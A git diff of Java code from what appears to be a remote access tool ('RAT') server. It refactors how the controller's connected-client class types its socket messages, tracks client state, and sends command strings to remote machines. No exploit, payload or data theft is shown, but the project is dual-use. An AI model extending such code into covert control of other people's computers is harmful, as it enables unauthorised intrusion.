@@ -4,9 +4,7 @@ import main.java.Main;
 import main.java.rat.handlers.InputOutputHandler;
 import main.java.rat.listeners.InputOutputListener;
 import main.java.rat.logger.StringLogger;
-import main.java.rat.models.ComputerInfo;
-import main.java.rat.models.SocketMessage;
-import main.java.rat.models.StringSocketMessage;
+import main.java.rat.models.*;
 import main.java.rat.server.RATServer;
 
 import java.util.ArrayList;
@@ -19,6 +17,8 @@ public class RATConnectedClient implements InputOutputListener {
     private boolean initStage = false;
     private int id;
 
+    public ClientState state;
+
     public ComputerInfo clientComputerInfo;
 
     public RATConnectedClient(StringLogger logger, int id, InputOutputHandler inputOutputHandler, RATServer ratServer) {
@@ -27,6 +27,7 @@ public class RATConnectedClient implements InputOutputListener {
         this.inputOutput = inputOutputHandler;
         this.logger = logger;
         initStage = true;
+        state = new ClientState();
         inputOutput.setListener(this);
     }
 
@@ -45,16 +46,17 @@ public class RATConnectedClient implements InputOutputListener {
             }
         } else {
             SocketMessage message = (SocketMessage) rawMessage;
-            if(message.isInfo() && message instanceof StringSocketMessage) {
+            if(message instanceof InfoSocketMessage) {
                 logger.log((String) message.getContent());
+            } else if(message instanceof ClientStateSocketMessage) {
+                this.state = ((ClientStateSocketMessage) message).getContent();
             }
         }
     }
 
     public void sendCommand(String commandStr) {
-        StringSocketMessage commandMessage = new StringSocketMessage();
+        CommandSocketMessage commandMessage = new CommandSocketMessage();
         commandMessage.setContent(commandStr);
-        commandMessage.setIsCommand();
         sendMessage(commandMessage);
     }
 
